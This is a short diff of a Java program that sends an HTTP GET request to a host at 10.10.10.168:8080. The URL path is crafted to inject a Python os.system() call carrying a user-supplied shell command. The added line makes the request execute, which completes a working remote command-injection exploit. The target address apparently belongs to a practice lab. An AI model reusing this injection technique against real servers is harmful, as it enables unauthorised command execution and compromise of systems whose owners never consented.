@@ -88,6 +88,7 @@ public class App {
 			url = new URL("http://10.10.10.168:8080/';path='/';os.system("+"'"+cmd+"'"+");"+"'");
 			HttpURLConnection con = (HttpURLConnection) url.openConnection();
 			con.setRequestMethod("GET");
+			con.getInputStream();
 		} catch (MalformedURLException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
